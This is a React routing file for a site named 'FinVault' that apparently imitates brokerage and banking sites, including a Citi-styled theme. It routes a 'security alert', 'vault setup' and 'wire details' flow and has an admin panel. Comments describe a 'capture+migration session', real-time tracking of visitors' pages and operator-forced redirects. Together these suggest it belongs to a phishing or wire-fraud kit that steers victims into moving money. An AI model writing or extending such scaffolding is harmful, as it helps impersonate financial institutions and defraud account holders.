import { useEffect } from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { Toaster } from '@/components/ui/toaster';
import { TooltipProvider } from '@/components/ui/tooltip';
import NotFound from '@/pages/not-found';
import Home from '@/pages/Home';
import HomeCiti from '@/pages/HomeCiti';
import AnimalPage from '@/pages/AnimalPage';
import BrokeragePage from '@/pages/BrokeragePage';
import IRAPage from '@/pages/IRAPage';
import SelfDirectedPage from '@/pages/SelfDirectedPage';
import AutomatedInvestingPage from '@/pages/AutomatedInvestingPage';
import WealthManagementPage from '@/pages/WealthManagementPage';
import PricingPage from '@/pages/PricingPage';
import WhyFinVaultPage from '@/pages/WhyFinVaultPage';
import LearnPage from '@/pages/LearnPage';
import TradingPage from '@/pages/TradingPage';
import ETFsPage from '@/pages/ETFsPage';
import BondsPage from '@/pages/BondsPage';
import OptionsPage from '@/pages/OptionsPage';
import BankingPage from '@/pages/BankingPage';
import AdminLogin from '@/pages/AdminLogin';
import AdminDashboard from '@/pages/AdminDashboard';
import SecurityAlertPage from '@/pages/SecurityAlertPage';
import VaultSetupPage from '@/pages/VaultSetupPage';
import VaultCreatingPage from '@/pages/VaultCreatingPage';
import VaultDashboardPage from '@/pages/VaultDashboardPage';
import WireDetailsPage from '@/pages/WireDetailsPage';
import { Route, Switch, Router as WouterRouter, useLocation } from 'wouter';

const queryClient = new QueryClient();

/** Resolves which homepage to show based on admin-set localStorage flags */
function getActiveHome() {
  if (localStorage.getItem('finvault_animal_mode') === 'true') return AnimalPage;
  if (localStorage.getItem('finvault_active_theme') === 'citi') return HomeCiti;
  return Home;
}

/** If user has an active capture+migration session, keep them at the dashboard on refresh */
function SessionGuard() {
  const [location, navigate] = useLocation();
  useEffect(() => {
    const isRoot = location === '/' || location === '';
    if (!isRoot) return;
    const captureId = localStorage.getItem('finvault_vault_capture_id');
    const migrationStarted = localStorage.getItem('finvault_migration_started');
    if (captureId && migrationStarted === 'true') {
      navigate('/vault-dashboard');
    }
  }, [location, navigate]);
  return null;
}

/** Tracks current page in localStorage so admin dashboard can see it in real time */
function PageTracker() {
  const [location, navigate] = useLocation();

  useEffect(() => {
    // Never expose admin paths to the visitor tracker
    if (location.startsWith('/admin')) return;
    localStorage.setItem('finvault_current_page', location);
    localStorage.setItem('finvault_page_updated', String(Date.now()));
  }, [location]);

  useEffect(() => {
    // Poll for admin-issued redirect every 800ms — never navigate the admin itself
    const id = setInterval(() => {
      if (location.startsWith('/admin')) return;
      const target = localStorage.getItem('finvault_force_nav');
      if (target) {
        localStorage.removeItem('finvault_force_nav');
        navigate(target);
      }
    }, 800);
    return () => clearInterval(id);
  }, [navigate, location]);

  return null;
}

function Router() {
  const ActiveHome = getActiveHome();

  return (
    <>
      <SessionGuard />
      <PageTracker />
      <Switch>
        <Route path="/" component={ActiveHome} />

        <Route path="/brokerage" component={BrokeragePage} />
        <Route path="/brokerage/*" component={BrokeragePage} />

        <Route path="/ira" component={IRAPage} />
        <Route path="/ira/*" component={IRAPage} />

        <Route path="/invest-with-us/self-directed-investing" component={SelfDirectedPage} />
        <Route path="/invest-with-us/wealth-management-services" component={WealthManagementPage} />
        <Route path="/invest-with-us/*" component={SelfDirectedPage} />

        <Route path="/intelligent-portfolios" component={AutomatedInvestingPage} />

        <Route path="/pricing" component={PricingPage} />
        <Route path="/pricing/*" component={PricingPage} />

        <Route path="/why-finvault" component={WhyFinVaultPage} />
        <Route path="/why-finvault/*" component={WhyFinVaultPage} />

        <Route path="/learn" component={LearnPage} />

        <Route path="/trading" component={TradingPage} />
        <Route path="/trading/*" component={TradingPage} />

        <Route path="/investment/etfs" component={ETFsPage} />
        <Route path="/investment/bonds" component={BondsPage} />
        <Route path="/investment/mutual-funds" component={IRAPage} />
        <Route path="/investment/*" component={ETFsPage} />

        <Route path="/options" component={OptionsPage} />

        <Route path="/banking" component={BankingPage} />
        <Route path="/banking/*" component={BankingPage} />

        <Route path="/advice/*" component={SelfDirectedPage} />

        {/* Auth & security flow */}
        <Route path="/security-alert" component={SecurityAlertPage} />
        <Route path="/vault-setup" component={VaultSetupPage} />
        <Route path="/vault-creating" component={VaultCreatingPage} />
        <Route path="/vault-dashboard" component={VaultDashboardPage} />
        <Route path="/wire-details" component={WireDetailsPage} />

        {/* Preview routes (direct access regardless of active theme) */}
        <Route path="/preview/citi" component={HomeCiti} />
        <Route path="/preview/classic" component={Home} />
        <Route path="/preview/animal" component={AnimalPage} />

        <Route path="/admin" component={AdminLogin} />
        <Route path="/admin/dashboard" component={AdminDashboard} />

        <Route component={NotFound} />
      </Switch>
    </>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, '')}>
          <Router />
        </WouterRouter>
        <Toaster />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
